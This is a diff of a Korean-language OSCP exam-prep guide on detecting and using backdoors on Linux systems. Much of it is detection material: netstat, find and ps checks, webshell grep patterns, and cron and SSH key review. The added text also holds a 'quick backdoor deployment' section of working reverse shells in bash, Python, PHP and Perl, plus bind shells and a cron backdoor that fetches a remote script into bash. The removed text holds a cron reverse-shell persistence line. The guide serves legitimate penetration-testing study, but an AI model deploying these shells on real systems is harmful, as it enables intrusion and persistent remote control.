@@ -1,215 +1,155 @@
-# 🚪 백도어 탐지 및 활용 가이드
+# 백도어 탐지 및 활용
 
-백도어는 일반적인 인증 메커니즘을 우회하여 시스템에 접근할 수 있게 해주는 방법입니다. OSCP 시험에서는 이러한 백도어를 발견하고 활용하는 능력이 중요합니다. 이 문서에서는 주로 `netcat`을 이용한 백도어 탐지 및 활용 방법을 다룹니다.
-
-## 1. 네트워크 연결 및 백도어 탐지
-
-### 🔍 열린 포트 및 수상한 연결 확인
+## 네트워크 연결 확인
 
 ```bash
-# 모든 활성 연결과 리스닝 포트 확인
-netstat -antup
+# 리스닝 포트 확인
+netstat -tunlp   # Linux
+netstat -ano     # Windows
 
-# 확립된 연결 확인
-netstat -antp | grep ESTABLISHED
+# 특이 연결 탐지
+netstat -antup | grep ESTABLISHED
+ss -antup        # 최신 리눅스 시스템에서는 ss 명령어 
 
-# 특정 프로세스에 연결된 포트 확인 (PID가 1234인 경우)
-netstat -antp | grep 1234
-```
-
-### 🔍 특이한 리스닝 포트 식별
-
-```bash
-# 표준 포트가 아닌 리스닝 포트 확인
+# 비정상 리스닝 포트 확인
 netstat -tunlp | grep -v -E "^(tcp6|udp6)"
-
-# 일반적이지 않은 포트 범위 확인 (예: > 10000)
-netstat -tunlp | grep -v -E "^(tcp6|udp6)" | grep -E ':1[0-9]{4}'
+netstat -tulpn | grep -E ':4444|:5555|:1337|:[0-9]{5}'  # 일반적인 백도어 포트
 ```
 
-## 2. 파일 시스템에서 백도어 흔적 찾기
-
-### 🔍 수상한 실행 파일 검색
+## 파일시스템 탐지
 
 ```bash
-# SUID 설정된 파일 검색 (권한 상승용 백도어일 수 있음)
-find / -perm -4000 -type f 2>/dev/null
+# 의심스러운 파일 검색
+find / -type f -mtime -1 -not -path "/proc/*" -ls 2>/dev/null  # 24시간 내 수정 파일
+find / -type f -perm -o+w -not -path "/proc/*" -ls 2>/dev/null  # 모두 쓰기 권한 파일
+find / -name ".*" -type f -not -path "/proc/*" 2>/dev/null     # 숨겨진 파일
 
-# 최근에 생성되거나 수정된 파일 검색
-find / -type f -mtime -7 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
-
-# 숨겨진 파일 및 디렉토리 검색
-find / -name ".*" -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
+# 웹 백도어 검색 (PHP)
+find /var/www/ -name "*.php" -type f -exec grep -l "system\|exec\|passthru\|shell_exec" {} \;
+find /var/www/ -name "*.php" -type f -exec grep -l "eval *(" {} \;
+find /var/www/ -name "*.php" -type f -exec grep -l "base64_decode" {} \;
 ```
 
-### 🔍 웹 서버 관련 백도어 검색
+## 프로세스/작업 검사
 
 ```bash
-# 웹 디렉토리에서 PHP 백도어 검색
-find /var/www/ -name "*.php" -type f -exec grep -l "system(" {} \; 2>/dev/null
-find /var/www/ -name "*.php" -type f -exec grep -l "eval(" {} \; 2>/dev/null
-find /var/www/ -name "*.php" -type f -exec grep -l "base64_decode(" {} \; 2>/dev/null
-```
+# 프로세스 검사
+ps aux --forest      # 트리 형태로 프로세스 확인
+ps aux | grep -i "nc\|netcat\|ncat\|socat"  # 네트워크 도구
+ps aux | grep -v "^root\|^www-data\|^nobody"  # 비정상 사용자 프로세스
 
-## 3. 시스템 프로세스 검사
-
-### 🔍 수상한 프로세스 확인
-
-```bash
-# 사용자 프로세스 확인
-ps aux | grep -v "root\|daemon\|bin"
-
-# 부모 프로세스가 없는 프로세스 찾기 (PID 1 제외)
-ps aux | awk '$3 == 1 && $2 != 1 {print}'
-```
-
-### 🔍 cron 작업 검사
-
-```bash
-# 시스템 전체 cron 작업 확인
-ls -la /etc/cron*
-
-# 사용자별 cron 작업 확인
-ls -la /var/spool/cron/crontabs/
-
-# cron 작업 내용 확인
+# 크론 작업 검사
 cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /var/spool/cron/crontabs/
+cat /var/spool/cron/crontabs/root  # 루트 크론 작업 확인
 ```
 
-## 4. Netcat을 이용한 백도어 탐지 및 테스트
-
-### 🔍 특정 포트 연결성 확인
+## Netcat 백도어 검사/활용
 
 ```bash
-# 특정 포트로 연결 테스트 (예: 포트 4444)
-nc -nvz 10.10.10.10 4444
+# 열린 포트 테스트
+nc -nvz 10.10.10.10 1-65535  # 전체 포트 스캔
+nc -nvz 10.10.10.10 4000-5000  # 범위 스캔
+nc -nvz 10.10.10.10 21 22 23 80 443 445 3306 5432 8080  # 특정 포트
 
-# 범위 포트 스캔 (예: 4000-5000)
-nc -nvz 10.10.10.10 4000-5000
+# 배너 그랩
+nc -nv 10.10.10.10 4444  # 특정 포트 배너 확인
+echo -e "GET / HTTP/1.0\r\n\r\n" | nc 10.10.10.10 80  # HTTP 배너
+
+# 백도어 연결
+nc 10.10.10.10 4444  # 기본 연결
+nc -vn 10.10.10.10 4444  # 상세 출력
 ```
 
-### 🔍 배너 그래빙으로 서비스 식별
+## 백도어 유형 및 활용
 
 ```bash
-# 특정 포트에서 실행 중인 서비스 확인
-echo "" | nc -nv 10.10.10.10 4444
+# 리버스 쉘 (타겟→공격자)
+# 공격자 측
+nc -lvnp 4444
+
+# 타겟 측
+bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
+nc -e /bin/bash 10.10.14.x 4444  # 구형 nc
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.x 4444 >/tmp/f  # 대안
 ```
 
-## 5. 발견된 백도어 연결 및 활용
+## 백도어 유형별 탐지/대응
 
-### 🔍 기존 백도어 연결 시도
-
+### PHP 웹 백도어
 ```bash
-# 단순 연결 시도
-nc 10.10.10.10 4444
+# 탐지
+grep -r "system\|exec\|shell_exec\|passthru\|eval" /var/www/
 
-# 대화형 세션 유지
-nc -vn 10.10.10.10 4444
+# 일반적 백도어 파라미터
+curl "http://target/shell.php?cmd=id"
+curl "http://target/shell.php?c=id"
+curl "http://target/shell.php?backdoor=id"
+curl "http://target/shell.php" -d "cmd=id"
+
+# 확인 방법
+md5sum /var/www/html/wp-content/uploads/shell.php
+stat /var/www/html/includes/shell.php  # 생성/수정 시간
 ```
 
-### 🔍 백도어 쉘에 연결
-
+### 크론 백도어
 ```bash
-# 기존 netcat 백도어에 연결
-nc 10.10.10.10 4444
+# 일반적 위치
+/etc/cron.d/
+/etc/crontab
+/var/spool/cron/crontabs/
 
-# 연결 후 명령어 실행 테스트
-whoami
-id
+# 백도어 예시
+*/10 * * * * root curl -s http://10.10.14.x/shell | bash
+@daily www-data /tmp/.backdoor
 ```
 
-## 6. 실제 시나리오 예시
-
-### 🔍 시나리오 1: 웹 서버 백도어 발견
-
-1. 웹 서버에서 수상한 PHP 파일 발견:
-
+### SSH 백도어
 ```bash
-find /var/www/ -type f -name "*.php" -mtime -2 | xargs cat | grep -i "backdoor\|shell\|system"
+# 인증키 확인
+find / -name "authorized_keys" -ls 2>/dev/null
+cat ~/.ssh/authorized_keys
+cat /root/.ssh/authorized_keys
+
+# 의심스러운 설정
+cat /etc/ssh/sshd_config | grep -i "PermitRoot\|PasswordAuth\|PubkeyAuth"
 ```
 
-2. 발견된 파일 분석 (`c99.php`):
+## 빠른 백도어 배포
 
+### 리버스 쉘 (타겟→공격자)
 ```bash
-cat /var/www/html/images/c99.php
-# 내용 중에 백도어 코드 확인: <?php system($_GET['cmd']); ?>
+# Bash
+bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+
+# PHP
+php -r '$sock=fsockopen("10.10.14.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Perl
+perl -e 'use Socket;$i="10.10.14.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-3. 백도어 접근 테스트:
-
+### 바인드 쉘 (공격자→타겟)
 ```bash
-curl "http://10.10.10.10/images/c99.php?cmd=whoami"
+# Netcat
+nc -lvp 4444 -e /bin/bash  # 타겟에서 실행
+nc 10.10.10.x 4444         # 공격자에서 연결
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
 ```
 
-### 🔍 시나리오 2: Netcat 리스너 백도어 발견
+## 백도어 탐지 체크리스트
 
-1. 수상한 프로세스 발견:
-
-```bash
-ps aux | grep nc
-# 발견: /bin/nc -lvp 4444 -e /bin/bash
-```
-
-2. 연결 테스트:
-
-```bash
-nc 10.10.10.10 4444
-whoami
-id
-```
-
-3. 정보 수집 및 권한 상승:
-
-```bash
-# 백도어 쉘 내에서
-uname -a
-sudo -l
-find / -perm -4000 -type f 2>/dev/null
-```
-
-## 7. 백도어 탐지 피하기 (방어자 관점)
-
-### 🔍 비표준 포트 사용
-
-```bash
-# 특이한(흔하지 않은) 포트 번호 사용
-nc -lvp 58742 -e /bin/bash
-```
-
-### 🔍 간헐적 연결 백도어 설정
-
-```bash
-# cron을 사용한 간헐적 백도어 (5분마다 외부로 연결 시도)
-echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1'" > /tmp/cronjob
-crontab /tmp/cronjob
-```
-
-## 8. 백도어 탐지를 위한 체크리스트
-
-- [ ] 네트워크 연결 검사 (`netstat -antup`)
-- [ ] 비정상적인 리스닝 포트 확인
-- [ ] SUID/SGID 파일 점검
-- [ ] 웹 디렉토리의 수상한 파일 확인
-- [ ] 사용자 프로세스 검사
-- [ ] Cron 작업 검토
-- [ ] 최근 생성/수정된 파일 확인
-
-## 💡 참고 사항
-
-1. OSCP 시험에서는 자동화된 도구 사용이 제한될 수 있으므로, 수동 분석 기법을 숙지하는 것이 중요합니다.
-2. 백도어 탐지 후에는 해당 백도어가 어떻게 설치되었는지 역추적하여 초기 침투 경로를 파악하는 것이 좋습니다.
-3. 시스템 로그 파일(`/var/log/` 디렉토리)을 검사하여 백도어 설치와 관련된 활동을 확인할 수 있습니다.
-
----
-
-## 🔗 OSCP 시험에서 사용 가능한 백도어 관련 명령어 치트 시트
-
-| 목적             | 명령어                                                               |
-| ---------------- | -------------------------------------------------------------------- |
-| 리스닝 포트 확인 | `netstat -tunlp`                                                     |
-| 수상한 연결 확인 | `netstat -antp \| grep ESTABLISHED`                                  |
-| SUID 파일 찾기   | `find / -perm -4000 -type f 2>/dev/null`                             |
-| 웹 백도어 검색   | `find /var/www/ -type f -name "*.php" -exec grep -l "system(" {} \;` |
-| 수상한 cron 확인 | `cat /etc/crontab`                                                   |
-| 특정 포트 테스트 | `nc -nvz 10.10.10.10 4444`                                           |
-| 백도어 연결      | `nc 10.10.10.10 4444`                                                |
+1. 네트워크 연결: `netstat -tunlp`, `ss -tunlp`
+2. 비정상 포트: `lsof -i`
+3. 의심 프로세스: `ps auxf`, `pstree -p`
+4. 크론 작업: `cat /etc/crontab`, `/var/spool/cron/crontabs/*`
+5. 웹쉘: `find /var/www -type f -mtime -3 -name "*.php"`
+6. 권한 설정: `find / -perm -4000 -ls 2>/dev/null`
+7. SSH 키: `~/.ssh/authorized_keys`
+8. 로그 확인: `/var/log/auth.log`, `/var/log/apache2/access.log`
